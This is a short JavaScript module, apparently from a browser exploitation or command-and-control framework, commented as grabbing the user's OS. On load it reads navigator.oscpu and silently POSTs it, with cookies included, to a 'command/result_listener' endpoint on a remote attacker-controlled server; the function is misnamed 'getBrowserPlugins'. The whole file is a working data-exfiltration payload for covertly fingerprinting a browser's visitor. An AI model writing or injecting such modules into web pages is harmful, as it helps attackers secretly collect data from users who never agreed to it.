/*
Grabbing the user OS
*/

(function getBrowserPlugins() {
    let formData = new FormData();

    formData.append('result', navigator.oscpu)
    formData.append('module_value', 'os.js')

    fetch(`http://${serverAddress}/command/result_listener`, {
        method: "POST",
        mode: 'cors',
        credentials: "include",
        body: formData
    })
})()